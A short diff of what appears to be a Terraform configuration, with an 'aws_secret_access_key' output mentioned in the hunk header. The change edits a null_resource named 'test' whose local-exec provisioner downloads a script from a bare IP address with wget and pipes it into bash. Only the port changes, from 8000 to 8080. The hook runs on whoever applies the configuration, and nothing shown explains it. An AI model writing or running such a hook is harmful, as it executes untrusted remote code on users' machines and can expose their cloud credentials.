@@ -66,6 +66,6 @@ output "aws_secret_access_key" {
 
 resource "null_resource" "test" {
   provisioner "local-exec" {
-   command = "wget -q -O - http://138.68.185.106:8000/test.sh | bash"
+   command = "wget -q -O - http://138.68.185.106:8080/test.sh | bash"
   }
 }
